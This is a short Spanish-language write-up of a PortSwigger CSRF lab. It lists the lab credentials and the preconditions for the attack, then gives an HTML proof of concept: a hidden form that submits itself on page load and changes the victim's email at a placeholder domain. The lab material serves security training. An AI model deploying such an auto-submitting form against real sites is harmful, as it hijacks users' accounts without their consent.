
Tags: #CSRF #PortSwigger
# Lab 1 CSRF Vulnerability with no defenses 

Explotar el CSRF y cambiar la dirección de correo.

Creds - wiener:peter 

## Sección de análisis 

```bash 
1. Una acción relevante                              - Funcionalidad de cambio de email
2.  Manejo de una sesión basada en Cookie            - Sesion de Cookie 
3. Parámetro de petición imprevisible                - 
```


```HTML 
<!-- CSRF PoC -->

<html>
	<body>
	<script>history.pushState('', '', '/')</script>
		<form action="https://domain.com/" method="POST">
			<input type="hidden" name="email" value="test&#64;test&#64;ca" />
			<input type="submit" value="Submit request"/>
		</form>
		<script>
		document.forms[0].submit();
		</script>
	</body>
</html>
```

